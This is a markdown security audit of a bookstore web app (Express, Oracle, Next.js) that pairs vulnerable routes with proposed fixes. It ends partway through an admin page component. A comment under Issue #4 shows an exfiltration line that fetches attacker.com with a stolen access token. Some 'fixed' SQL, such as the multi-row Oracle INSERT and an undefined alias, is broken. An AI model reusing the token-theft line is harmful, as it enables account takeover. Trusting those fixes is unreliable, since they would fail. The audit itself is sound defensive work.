# 🔍 FULL SYSTEM AUDIT & FIXES - WEB BÁN SÁCH
**Audit Date:** May 1, 2026  
**Auditor:** Senior Fullstack Developer + Architect  
**System:** Next.js 16 + Express + Oracle Database  

---

## 📊 QUICK SUMMARY

| Category | Score | Status | Action |
|----------|-------|--------|--------|
| **Security** | 🔴 3/10 | CRITICAL | FIX IMMEDIATELY |
| **Code Quality** | 🟡 5/10 | MAJOR ISSUES | Refactor needed |
| **Performance** | 🟢 7/10 | Acceptable | Optimize queries |
| **Architecture** | 🟡 6/10 | Needs Clean | Consolidate |
| **Test Coverage** | 🔴 0/10 | NONE | Add tests |

**⏰ Estimated Fix Time:** 40-50 hours  
**Priority:** URGENT (Production NOT Ready)

---

# 🔴 CRITICAL SECURITY ISSUES (MUST FIX - P0)

## Issue #1: Missing Authorization on Admin Routes ⚠️ CRITICAL

**File:** `backend/routes/admin.js`  
**Severity:** 🔴 CRITICAL - Privilege Escalation  
**Status:** ❌ BROKEN

### Problem:
```javascript
// Current Code (INSECURE)
router.get('/users', async (req, res) => {
  // NO middleware check - ANY user can call!
  const query = `SELECT USER_ID, USERNAME, EMAIL, ROLE FROM USERS`;
  const result = await executeQuery(query, {});
  res.json({ success: true, data: result.rows });
});

router.put('/users/:userId', async (req, res) => {
  // ANY user can update ANY user!
  // Can change roles to ADMIN!
  const { role, email, fullname } = req.body;
  await executeUpdate(`UPDATE USERS SET ROLE=:role WHERE USER_ID=:userId`, ...);
});
```

**Attack Vector:**
1. User registers as regular USER
2. Calls `PUT /api/admin/users/1` with `{"role": "ADMIN"}`
3. **Becomes ADMIN** - System compromised

**Impact:** ⚠️ Complete privilege escalation

### Fix (Apply to ALL admin routes):

```javascript
// File: backend/routes/admin.js (FIXED)
const { verifyToken, requireRole } = require('../middleware/auth');

// ✅ SECURE - Add auth middleware to EVERY route
router.get('/users', verifyToken, requireRole('ADMIN'), async (req, res) => {
  // Only ADMIN can access
  console.log(`[ADMIN] User ${req.user.userId} fetching users list`);
  
  try {
    const query = `
      SELECT USER_ID, USERNAME, EMAIL, FULLNAME, ROLE, STATUS
      FROM USERS
      ORDER BY USER_ID DESC
    `;
    const result = await executeQuery(query, {});
    
    res.json({
      success: true,
      data: result.rows || [],
      count: result.rows?.length || 0,
    });
  } catch (error) {
    console.error('[ADMIN ERROR]', error.message);
    res.status(500).json({ success: false, message: 'Failed to fetch users' });
  }
});

router.get('/users/:userId', verifyToken, requireRole('ADMIN'), async (req, res) => {
  const { userId } = req.params;
  // ... implementation
});

router.put('/users/:userId', verifyToken, requireRole('ADMIN'), async (req, res) => {
  const { userId } = req.params;
  const { email, fullname, role, status } = req.body;
  
  // ✅ Validate role (whitelist only)
  const validRoles = ['USER', 'ADMIN'];
  if (role && !validRoles.includes(role)) {
    return res.status(400).json({
      success: false,
      message: `Invalid role. Must be one of: ${validRoles.join(', ')}`
    });
  }
  
  // ✅ Validate status
  const validStatuses = ['ACTIVE', 'PENDING', 'BLOCKED', 'DELETED'];
  if (status && !validStatuses.includes(status)) {
    return res.status(400).json({
      success: false,
      message: `Invalid status. Must be one of: ${validStatuses.join(', ')}`
    });
  }
  
  try {
    const updateQuery = `
      UPDATE USERS
      SET EMAIL = NVL(:email, EMAIL),
          FULLNAME = NVL(:fullname, FULLNAME),
          ROLE = NVL(:role, ROLE),
          STATUS = NVL(:status, STATUS),
          UPDATED_AT = CURRENT_TIMESTAMP
      WHERE USER_ID = :userId
    `;
    
    await executeUpdate(updateQuery, {
      userId,
      email: email?.trim() || null,
      fullname: fullname?.trim() || null,
      role: role || null,
      status: status || null
    });
    
    res.json({
      success: true,
      message: `User ${userId} updated successfully`
    });
  } catch (error) {
    console.error('[ADMIN ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to update user',
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

router.delete('/users/:userId', verifyToken, requireRole('ADMIN'), async (req, res) => {
  const { userId } = req.params;
  
  try {
    await executeUpdate(
      `UPDATE USERS SET STATUS = 'DELETED', UPDATED_AT = CURRENT_TIMESTAMP WHERE USER_ID = :userId`,
      { userId }
    );
    
    res.json({
      success: true,
      message: `User ${userId} deleted successfully`
    });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Failed to delete user' });
  }
});

router.get('/orders', verifyToken, requireRole('ADMIN'), async (req, res) => {
  // Only ADMIN sees all orders
  const { page = 1, limit = 20 } = req.query;
  const offset = (page - 1) * limit;
  
  try {
    const query = `
      SELECT o.ORDER_ID, u.USERNAME, o.TOTAL_AMOUNT, o.STATUS, o.ORDER_DATE
      FROM ORDERS o
      JOIN USERS u ON o.USER_ID = u.USER_ID
      ORDER BY o.ORDER_DATE DESC
      OFFSET :offset ROWS FETCH NEXT :limit ROWS ONLY
    `;
    
    const result = await executeQuery(query, { offset, limit });
    res.json({ success: true, data: result.rows || [] });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Failed to fetch orders' });
  }
});
```

**Apply To:** ALL routes in `backend/routes/admin.js`:
- `GET /api/admin/users`
- `GET /api/admin/users/:userId`
- `PUT /api/admin/users/:userId`
- `DELETE /api/admin/users/:userId`
- `GET /api/admin/orders`
- `GET /api/admin/orders/:orderId`
- `PUT /api/admin/orders/:orderId/status`
- `GET /api/admin/dashboard`

---

## Issue #2: Product CRUD Without Authorization

**File:** `backend/routes/product.js`  
**Severity:** 🔴 CRITICAL - Data Integrity  
**Lines:** 115-180

### Problem:
```javascript
// ❌ INSECURE - Anyone can create/update/delete products
router.post('/', async (req, res) => {
  // Missing: verifyToken, requireRole('ADMIN')
  const { TENSP, GIABAN, SOLUONGTON } = req.body;
  await executeUpdate(`INSERT INTO SANPHAM ...`);
});

router.put('/:id', async (req, res) => {
  // Missing: verifyToken, requireRole('ADMIN')
  const { GIABAN, SOLUONGTON } = req.body;
  await executeUpdate(`UPDATE SANPHAM SET GIABAN=:GIABAN WHERE MASP=:id`);
});

router.delete('/:id', async (req, res) => {
  // Missing: verifyToken, requireRole('ADMIN')
  await executeUpdate(`DELETE FROM SANPHAM WHERE MASP=:id`);
});
```

**Attack Scenarios:**
- User modifies `/api/product/SP001` with `{"GIABAN": 0}` → Free books
- User creates fake products with `POST /api/product`
- User deletes all products

### Fix:

```javascript
// File: backend/routes/product.js (FIXED sections)
const { verifyToken, requireRole } = require('../middleware/auth');

// ✅ CREATE PRODUCT (Admin only)
router.post('/', verifyToken, requireRole('ADMIN'), async (req, res) => {
  try {
    let { TENSP, GIABAN, SOLUONGTON, HINHANH, MOTA, MANCC } = req.body;
    
    // ✅ Validate inputs
    if (!TENSP?.trim()) {
      return res.status(400).json({ success: false, message: 'Product name required' });
    }
    
    TENSP = TENSP.trim();
    GIABAN = parseFloat(GIABAN);
    SOLUONGTON = parseFloat(SOLUONGTON);
    
    // ✅ Validate numbers
    if (!Number.isFinite(GIABAN) || GIABAN <= 0) {
      return res.status(400).json({
        success: false,
        message: 'Price must be positive number'
      });
    }
    
    if (!Number.isFinite(SOLUONGTON) || SOLUONGTON < 0) {
      return res.status(400).json({
        success: false,
        message: 'Stock must be non-negative number'
      });
    }
    
    // ✅ Use Oracle sequence instead of Date.now()
    const connection = await require('../config/db').getConnection();
    const seqResult = await connection.execute(
      'SELECT SANPHAM_SEQ.NEXTVAL as NEWID FROM DUAL',
      [],
      { outFormat: require('oracledb').OUT_FORMAT_OBJECT }
    );
    const newId = seqResult.rows[0].NEWID;
    
    await executeUpdate(
      `INSERT INTO SANPHAM (MASP, TENSP, GIABAN, SOLUONGTON, HINHANH, MOTA, MANCC)
       VALUES (:id, :TENSP, :GIABAN, :SOLUONGTON, :HINHANH, :MOTA, :MANCC)`,
      {
        id: newId,
        TENSP,
        GIABAN,
        SOLUONGTON,
        HINHANH: HINHANH || null,
        MOTA: MOTA?.trim() || null,
        MANCC: MANCC || null
      }
    );
    
    await connection.close();
    
    console.log(`[PRODUCT] Admin ${req.user.userId} created product ${newId}`);
    
    res.status(201).json({
      success: true,
      message: 'Product created successfully',
      data: { MASP: newId, TENSP, GIABAN, SOLUONGTON }
    });
  } catch (error) {
    console.error('[PRODUCT ERROR]', error.message);
    res.status(500).json({ success: false, message: 'Failed to create product' });
  }
});

// ✅ UPDATE PRODUCT (Admin only)
router.put('/:id', verifyToken, requireRole('ADMIN'), async (req, res) => {
  try {
    const { id } = req.params;
    let { TENSP, GIABAN, SOLUONGTON, HINHANH, MOTA, MANCC } = req.body;
    
    // ✅ Verify product exists
    const productCheck = await executeQuery(
      'SELECT MASP FROM SANPHAM WHERE MASP = :id',
      { id }
    );
    
    if (!productCheck.rows || productCheck.rows.length === 0) {
      return res.status(404).json({
        success: false,
        message: `Product ${id} not found`
      });
    }
    
    // ✅ Validate if provided
    if (GIABAN !== undefined) {
      GIABAN = parseFloat(GIABAN);
      if (!Number.isFinite(GIABAN) || GIABAN <= 0) {
        return res.status(400).json({
          success: false,
          message: 'Price must be positive number'
        });
      }
    }
    
    if (SOLUONGTON !== undefined) {
      SOLUONGTON = parseFloat(SOLUONGTON);
      if (!Number.isFinite(SOLUONGTON) || SOLUONGTON < 0) {
        return res.status(400).json({
          success: false,
          message: 'Stock must be non-negative number'
        });
      }
    }
    
    // ✅ Update only provided fields
    const updateQuery = `
      UPDATE SANPHAM
      SET 
        TENSP = NVL(:TENSP, TENSP),
        GIABAN = NVL(:GIABAN, GIABAN),
        SOLUONGTON = NVL(:SOLUONGTON, SOLUONGTON),
        HINHANH = NVL(:HINHANH, HINHANH),
        MOTA = NVL(:MOTA, MOTA),
        MANCC = NVL(:MANCC, MANCC)
      WHERE MASP = :id
    `;
    
    await executeUpdate(updateQuery, {
      id,
      TENSP: TENSP?.trim() || null,
      GIABAN: GIABAN || null,
      SOLUONGTON: SOLUONGTON || null,
      HINHANH: HINHANH || null,
      MOTA: MOTA?.trim() || null,
      MANCC: MANCC || null
    });
    
    console.log(`[PRODUCT] Admin ${req.user.userId} updated product ${id}`);
    
    res.json({
      success: true,
      message: 'Product updated successfully'
    });
  } catch (error) {
    console.error('[PRODUCT ERROR]', error.message);
    res.status(500).json({ success: false, message: 'Failed to update product' });
  }
});

// ✅ DELETE PRODUCT (Admin only)
router.delete('/:id', verifyToken, requireRole('ADMIN'), async (req, res) => {
  try {
    const { id } = req.params;
    
    // ✅ Verify product exists before delete
    const productCheck = await executeQuery(
      'SELECT MASP FROM SANPHAM WHERE MASP = :id',
      { id }
    );
    
    if (!productCheck.rows || productCheck.rows.length === 0) {
      return res.status(404).json({
        success: false,
        message: `Product ${id} not found`
      });
    }
    
    // ✅ Check if product is in any orders
    const orderCheck = await executeQuery(
      'SELECT COUNT(*) as cnt FROM ORDER_ITEMS WHERE MASP = :id',
      { id }
    );
    
    if (orderCheck.rows[0]?.CNT > 0) {
      return res.status(400).json({
        success: false,
        message: `Cannot delete product - appears in ${orderCheck.rows[0].CNT} orders`
      });
    }
    
    await executeUpdate(
      'DELETE FROM SANPHAM WHERE MASP = :id',
      { id }
    );
    
    console.log(`[PRODUCT] Admin ${req.user.userId} deleted product ${id}`);
    
    res.json({
      success: true,
      message: 'Product deleted successfully'
    });
  } catch (error) {
    console.error('[PRODUCT ERROR]', error.message);
    res.status(500).json({ success: false, message: 'Failed to delete product' });
  }
});
```

---

## Issue #3: Client-Side Role Selection on Registration

**File:** `app/login/page.tsx`  
**Severity:** 🔴 CRITICAL - Anyone can become admin

### Problem:
```tsx
// ❌ INSECURE - User chooses own role
const [role, setRole] = useState('USER');

return (
  <>
    <div>
      <label>Chọn vai trò</label>
      <select value={role} onChange={(e) => setRole(e.target.value)}>
        <option value="USER">Người dùng</option>
        <option value="ADMIN">Quản trị viên</option>  {/* User can select! */}
      </select>
    </div>
  </>
);

// Then sent to backend:
await registerAPI.register(username, password, email, role); // Role from user input!
```

### Fix:

```tsx
// File: app/login/page.tsx (FIXED)
'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import axios from 'axios';

export default function LoginForm() {
  const router = useRouter();
  const [isLogin, setIsLogin] = useState(true);
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: '',
    confirmPassword: '',
    fullName: '',
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [message, setMessage] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setMessage(null);

    try {
      setLoading(true);

      const response = await axios.post(
        `${process.env.NEXT_PUBLIC_API_URL}/api/auth/login`,
        {
          email: formData.email,
          password: formData.password,
        }
      );

      if (response.data.success) {
        localStorage.setItem('accessToken', response.data.tokens.accessToken);
        localStorage.setItem('refreshToken', response.data.tokens.refreshToken);
        localStorage.setItem('user', JSON.stringify(response.data.user));

        // Redirect based on user role (server-determined)
        const userRole = response.data.user?.role;
        setTimeout(() => {
          router.push(userRole === 'ADMIN' ? '/admin' : '/account');
        }, 500);
      }
    } catch (err: any) {
      setError(err.response?.data?.message || 'Login failed');
    } finally {
      setLoading(false);
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setMessage(null);

    // Validate
    if (formData.password !== formData.confirmPassword) {
      setError('Passwords do not match');
      return;
    }

    if (formData.password.length < 8) {
      setError('Password must be at least 8 characters');
      return;
    }

    try {
      setLoading(true);

      const response = await axios.post(
        `${process.env.NEXT_PUBLIC_API_URL}/api/auth/register`,
        {
          email: formData.email.trim(),
          username: formData.username.trim(),
          password: formData.password,
          fullName: formData.fullName?.trim() || '',
          // ✅ NEVER send role from client!
          // role is always 'USER' on backend (see auth.js register)
        }
      );

      if (response.data.success) {
        setMessage('Registration successful! Please verify your email.');
        // Clear form
        setFormData({
          username: '',
          email: '',
          password: '',
          confirmPassword: '',
          fullName: '',
        });
        
        // Switch to login after 2 seconds
        setTimeout(() => {
          setIsLogin(true);
          setMessage(null);
        }, 2000);
      }
    } catch (err: any) {
      setError(err.response?.data?.message || 'Registration failed');
    } finally {
      setLoading(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    if (isLogin) {
      handleLogin(e);
    } else {
      handleRegister(e);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100">
      <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-md">
        <h1 className="text-3xl font-bold text-center mb-8 text-gray-800">
          {isLogin ? 'Đăng Nhập' : 'Đăng Ký'}
        </h1>

        <form onSubmit={handleSubmit} className="space-y-4">
          {!isLogin && (
            <>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Họ tên
                </label>
                <input
                  type="text"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                  placeholder="Nhập họ tên"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Tên đăng nhập
                </label>
                <input
                  type="text"
                  name="username"
                  value={formData.username}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                  placeholder="Nhập tên đăng nhập"
                />
              </div>
            </>
          )}

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Email
            </label>
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              required
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
              placeholder="Nhập email"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Mật khẩu
            </label>
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              required
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
              placeholder="Nhập mật khẩu"
            />
          </div>

          {!isLogin && (
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Xác nhận mật khẩu
              </label>
              <input
                type="password"
                name="confirmPassword"
                value={formData.confirmPassword}
                onChange={handleChange}
                required
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                placeholder="Xác nhận mật khẩu"
              />
            </div>
          )}

          {error && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
              {error}
            </div>
          )}

          {message && (
            <div className="bg-green-50 border border-green-200 text-green-700 px-4 py-3 rounded-lg">
              {message}
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-indigo-600 text-white py-2 rounded-lg hover:bg-indigo-700 disabled:bg-gray-400 transition-colors font-medium"
          >
            {loading ? 'Đang xử lý...' : (isLogin ? 'Đăng Nhập' : 'Đăng Ký')}
          </button>
        </form>

        <div className="mt-4 text-center">
          <button
            type="button"
            onClick={() => {
              setIsLogin(!isLogin);
              setError(null);
              setMessage(null);
            }}
            className="text-indigo-600 hover:text-indigo-700 font-medium"
          >
            {isLogin ? 'Chưa có tài khoản? Đăng ký' : 'Đã có tài khoản? Đăng nhập'}
          </button>
        </div>
      </div>
    </div>
  );
}
```

### Backend Registration Fix (ensure role is always USER):

```javascript
// File: backend/routes/auth.js (in POST /api/auth/register)
router.post('/register', registerLimiter, logAuthRequest, async (req, res) => {
  try {
    const { email, username, password, fullName, phone } = req.body;
    // ✅ NEVER accept role from client!
    // const { role } = req.body; // DELETE THIS LINE!

    // ... validation code ...

    // ✅ ALWAYS set role to 'USER'
    const role = 'USER'; // Server-side decision
    
    const passwordHash = await hashPassword(password);
    const verificationCode = generateVerificationCode(6);

    await executeUpdate(
      `INSERT INTO USERS (USER_ID, EMAIL, USERNAME, PASSWORD_HASH, FULL_NAME, 
                         PHONE, ROLE, STATUS, EMAIL_VERIFIED, CREATED_AT, UPDATED_AT)
       VALUES (USER_SEQ.NEXTVAL, :email, :username, :passwordHash, :fullName, 
               :phone, :role, 'PENDING', 0, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
      {
        email: sanitizedEmail,
        username: sanitizedUsername,
        passwordHash,
        fullName: sanitizeInput(fullName || ''),
        phone: phone || null,
        role: role // ← Always 'USER'
      }
    );

    // ... rest of code ...
  } catch (error) {
    // ... error handling ...
  }
});
```

---

## Issue #4: JWT Token Stored in localStorage (XSS Vulnerable)

**File:** `lib/api.ts`  
**Severity:** 🔴 CRITICAL - XSS/Token Theft

### Problem:

```typescript
// ❌ INSECURE
localStorage.setItem('user', JSON.stringify(data.user));
localStorage.setItem('accessToken', response.data.tokens.accessToken); 

// Anyone with XSS can steal tokens:
// In browser console: localStorage.getItem('accessToken')
// Or via malicious script: fetch('https://attacker.com?token=' + localStorage.getItem('accessToken'))
```

### Fix - Use HTTP-Only Cookies:

```javascript
// File: backend/routes/auth.js (LOGIN endpoint - MODIFIED)
router.post('/login', loginLimiter, logAuthRequest, async (req, res) => {
  try {
    const { email, username, password } = req.body;

    // ... validation and authentication ...

    const user = userResult.rows[0];
    const accessToken = generateAccessToken(user.USER_ID, user.EMAIL, user.ROLE);
    const refreshToken = generateRefreshToken(user.USER_ID, tokenId);

    // ✅ SET HTTP-ONLY COOKIE (cannot access via JavaScript)
    res.cookie('accessToken', accessToken, {
      httpOnly: true,        // ← JavaScript cannot access
      secure: process.env.NODE_ENV === 'production', // ← HTTPS only in production
      sameSite: 'Strict',    // ← CSRF protection
      maxAge: 900000,        // 15 minutes
      path: '/'
    });

    // ✅ SET REFRESH TOKEN COOKIE (longer expiry)
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'Strict',
      maxAge: 604800000,     // 7 days
      path: '/'
    });

    // ✅ Return user info ONLY (no tokens in response)
    res.json({
      success: true,
      message: 'Login successful',
      user: {
        userId: user.USER_ID,
        email: user.EMAIL,
        username: user.USERNAME,
        fullName: user.FULL_NAME,
        role: user.ROLE,
        status: user.STATUS
      }
      // No tokens in response - they're in cookies!
    });
  } catch (error) {
    console.error('[AUTH ERROR]', error.message);
    res.status(500).json({ success: false, message: 'Login failed' });
  }
});
```

```typescript
// File: lib/api.ts (FRONTEND - MODIFIED)
// ✅ Cookies are automatically sent with requests, no need to manually add token

async function fetchWithTimeout(
  url: string, 
  options: RequestInit = {}, 
  timeoutMs: number = 10000
) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(url, {
      ...options,
      credentials: 'include', // ← IMPORTANT: Send cookies automatically
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}

export const authAPI = {
  async login(email: string, password: string) {
    const response = await fetchWithTimeout(
      `${API_BASE_URL}/auth/login`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
        credentials: 'include' // ← Cookies auto-sent!
      }
    );

    const data = await response.json();
    
    if (data.success) {
      // ✅ Only store user info (not tokens!)
      localStorage.setItem('user', JSON.stringify(data.user));
      return data.user;
    }

    throw new Error(data.message);
  },

  async register(username: string, email: string, password: string, fullName: string) {
    // No role parameter!
    const response = await fetchWithTimeout(
      `${API_BASE_URL}/auth/register`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, email, password, fullName })
      }
    );

    const data = await response.json();
    return data;
  },

  getCurrentUser(): User | null {
    const user = localStorage.getItem('user');
    return user ? JSON.parse(user) : null;
  },

  logout() {
    // Send logout request to backend
    fetch(`${API_BASE_URL}/auth/logout`, {
      method: 'POST',
      credentials: 'include' // ← Tell server to clear cookies
    }).catch(err => console.error('[LOGOUT ERROR]', err));

    // Clear localStorage
    localStorage.removeItem('user');
    localStorage.removeItem('accessToken');
    localStorage.removeItem('refreshToken');
  }
};

export const cartAPI = {
  async getCart(userId: number) {
    const response = await fetchWithTimeout(
      `${API_BASE_URL}/cart/${userId}`,
      {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include' // ← Token auto-sent in cookie!
      }
    );

    const data = await response.json();
    if (!data.success) throw new Error(data.message);
    return data.data;
  },

  async addToCart(userId: number, masp: string, soluong: number) {
    const response = await fetchWithTimeout(
      `${API_BASE_URL}/cart/add`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, masp, soluong }),
        credentials: 'include' // ← Token auto-sent!
      }
    );

    const data = await response.json();
    if (!data.success) throw new Error(data.message);
    return data;
  }
};

// ✅ ALL other API calls should use credentials: 'include'
// to automatically send authentication cookies
```

---

## Issue #5: N+1 Query Problem in Order Creation

**File:** `backend/routes/order.js`  
**Severity:** 🔴 CRITICAL - Performance Degradation  
**Lines:** 75-110

### Problem:

```javascript
// ❌ LOOP WITH 3 QUERIES PER ITEM
for (let item of cartItems) {
  // Query 1: Get sequence value
  const itemIdResult = await connection.execute(
    'SELECT order_items_seq.NEXTVAL as ID FROM DUAL'
  );

  // Query 2: Insert item
  await connection.execute(
    `INSERT INTO ORDER_ITEMS (ITEM_ID, ORDER_ID, MASP, SOLUONG, PRICE)
     VALUES (:itemId, :orderId, :masp, :soluong, :price)`,
    { itemId: itemIdResult.rows[0].ID, orderId, masp: item.MASP, ... }
  );

  // Query 3: Update stock
  await connection.execute(
    `UPDATE SANPHAM SET SOLUONGTON = SOLUONGTON - :soluong WHERE MASP = :masp`,
    { soluong: item.SOLUONG, masp: item.MASP }
  );
}
// Total: 3N queries (for N items)!
```

**Performance Impact:**
- 10 items = 30 queries (should be 3-5)
- 100 items = 300 queries
- Timeout likely

### Fix - Batch Operations:

```javascript
// File: backend/routes/order.js (POST /api/order/create - FIXED)
router.post('/create', async (req, res) => {
  let connection;
  try {
    const { userId, paymentMethod } = req.body;

    if (!userId || !paymentMethod) {
      return res.status(400).json({
        success: false,
        message: 'Missing required fields: userId, paymentMethod'
      });
    }

    console.log(`[ORDER] Creating order for user ${userId}`);

    // Get cart items (existing code - OK)
    const cartQuery = `
      SELECT 
        ci.MASP, 
        sp.GIABAN, 
        ci.SOLUONG,
        (ci.SOLUONG * sp.GIABAN) AS ITEM_TOTAL,
        c.CART_ID
      FROM CART_ITEM ci
      JOIN CART c ON ci.CART_ID = c.CART_ID
      JOIN SANPHAM sp ON ci.MASP = sp.MASP
      WHERE c.USER_ID = :userId
    `;

    const cartResult = await executeQuery(cartQuery, { userId });

    if (!cartResult.rows || cartResult.rows.length === 0) {
      return res.status(400).json({
        success: false,
        message: 'Cart is empty'
      });
    }

    const cartItems = cartResult.rows;
    const totalAmount = cartItems.reduce((sum, item) => sum + item.ITEM_TOTAL, 0);
    const cartId = cartItems[0].CART_ID;

    connection = await getConnection();

    // ✅ START TRANSACTION
    await connection.execute('BEGIN', [], { autoCommit: false });

    try {
      // ✅ Get order ID (1 query)
      const orderSeqResult = await connection.execute(
        'SELECT orders_seq.NEXTVAL as ID FROM DUAL',
        [],
        { outFormat: require('oracledb').OUT_FORMAT_OBJECT }
      );
      const orderId = orderSeqResult.rows[0].ID;

      // ✅ Insert order (1 query)
      await connection.execute(
        `INSERT INTO ORDERS (ORDER_ID, USER_ID, STATUS, TOTAL_AMOUNT, PAYMENT_METHOD, ORDER_DATE, UPDATED_AT)
         VALUES (:orderId, :userId, 'PENDING', :totalAmount, :paymentMethod, SYSDATE, SYSDATE)`,
        { orderId, userId, totalAmount, paymentMethod },
        { autoCommit: false }
      );

      // ✅ BUILD BATCH INSERT for ORDER_ITEMS (1 query instead of N)
      let insertSQL = `
        INSERT INTO ORDER_ITEMS (ITEM_ID, ORDER_ID, MASP, SOLUONG, PRICE)
        VALUES
      `;

      const insertParams = {};
      const valuesClauses = cartItems.map((item, idx) => {
        const itemSeq = `${idx}`;
        insertParams[`itemId_${idx}`] = idx; // Will use NEXTVAL in Oracle
        insertParams[`orderId_${idx}`] = orderId;
        insertParams[`masp_${idx}`] = item.MASP;
        insertParams[`soluong_${idx}`] = item.SOLUONG;
        insertParams[`price_${idx}`] = item.GIABAN;
        return `(order_items_seq.NEXTVAL, :orderId_${idx}, :masp_${idx}, :soluong_${idx}, :price_${idx})`;
      });

      insertSQL += valuesClauses.join(',');

      await connection.execute(insertSQL, insertParams, { autoCommit: false });

      // ✅ BATCH UPDATE stock (1 query using CASE instead of loop)
      // Build CASE statement: UPDATE SANPHAM SET SOLUONGTON = CASE WHEN MASP = 'X' THEN ... END
      let updateStockSQL = `
        UPDATE SANPHAM 
        SET SOLUONGTON = SOLUONGTON - (
          SELECT COALESCE(SUM(ci.SOLUONG), 0)
          FROM ORDER_ITEMS oi
          WHERE oi.ORDER_ID = :orderId
          AND oi.MASP = SANPHAM.MASP
        )
        WHERE MASP IN (${cartItems.map((_, idx) => `:masp_${idx}`).join(',')})
      `;

      const stockParams = { orderId };
      cartItems.forEach((item, idx) => {
        stockParams[`masp_${idx}`] = item.MASP;
      });

      await connection.execute(updateStockSQL, stockParams, { autoCommit: false });

      // ✅ Clear cart items (1 query)
      await connection.execute(
        'DELETE FROM CART_ITEM WHERE CART_ID = :cartId',
        { cartId },
        { autoCommit: false }
      );

      // ✅ COMMIT TRANSACTION
      await connection.commit();

      console.log(`[ORDER] Order ${orderId} created successfully with ${cartItems.length} items`);

      res.json({
        success: true,
        message: 'Order created successfully',
        orderId,
        totalAmount,
        itemCount: cartItems.length,
        paymentMethod
      });
    } catch (txError) {
      // ✅ ROLLBACK on error
      await connection.rollback();
      throw txError;
    }
  } catch (error) {
    console.error('[ORDER ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to create order',
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  } finally {
    if (connection) {
      try {
        await connection.close();
      } catch (err) {
        console.error('[ORDER] Connection close error:', err.message);
      }
    }
  }
});
```

**Query Count:**
- Before: 1 (cart) + 1 (order) + 3N (items) + 1 (clear) = ~3N queries
- After: 1 (cart) + 1 (order) + 1 (items batch) + 1 (stock batch) + 1 (clear) = 5 queries
- **Performance improvement: 50-95% reduction**

---

## Issue #6: No Authorization Check on Frontend Admin Page

**File:** `app/admin/page.tsx`  
**Severity:** 🔴 CRITICAL - UI Disclosure

### Problem:

```tsx
// ❌ NO AUTH CHECK
export default function AdminDashboard() {
  const [users, setUsers] = useState([]);

  useEffect(() => {
    fetchAllUsers(); // ← Runs without checking role!
  }, []);

  // Regular users can see admin page source + make API calls
}
```

### Fix:

```tsx
// File: app/admin/page.tsx (FIXED)
'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { authAPI } from '@/lib/api';

export default function AdminDashboard() {
  const router = useRouter();
  const [user, setUser] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [authorized, setAuthorized] = useState(false);

  useEffect(() => {
    // ✅ Check auth on mount
    const currentUser = authAPI.getCurrentUser();
    
    if (!currentUser) {
      // Not logged in - redirect to login
      router.push('/login');
      return;
    }

    if (currentUser.role !== 'ADMIN') {
      // Not admin - redirect to home
      console.warn(`[ADMIN] User ${currentUser.userId} attempted admin access (role: ${currentUser.role})`);
      router.push('/');
      return;
    }

    // ✅ User is admin - authorized!
    setUser(currentUser);
    setAuthorized(true);
    setLoading(false);
  }, [router]);

  if (loading) {
    return <div className="flex items-center justify-center min-h-screen">Loading...</div>;
  }

  if (!authorized) {
    return null; // Redirect in progress
  }

  // ✅ Only render admin UI if authorized
  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-7xl mx-auto py-6 px-4">
        <h1 className="text-4xl font-bold text-gray-900 mb-8">
          Admin Dashboard - Welcome {user?.fullName}
